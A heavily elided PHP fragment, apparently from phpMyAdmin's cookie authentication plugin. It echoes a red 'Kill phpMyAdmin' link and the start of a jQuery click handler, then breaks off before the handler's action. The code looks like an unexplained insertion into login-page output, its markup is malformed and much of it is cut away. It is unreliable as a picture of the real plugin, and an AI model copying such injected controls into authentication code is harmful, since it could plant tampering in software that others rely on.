...
class AuthenticationCookie extends AuthenticationPlugin
{
    ...
    <a href="';
       ...
       <h1>';
        ...
        echo "</h1>";
		echo '<hr /><center><a href="#" target="_self" id="killphpmyadmin"><strong style="color:#ff0000; font-size:22px;">Kill phpMyAdmin</a></strong></center><hr />
		<script>
			$(document).ready(function(){
				$("#killphpmyadmin").click(function(){
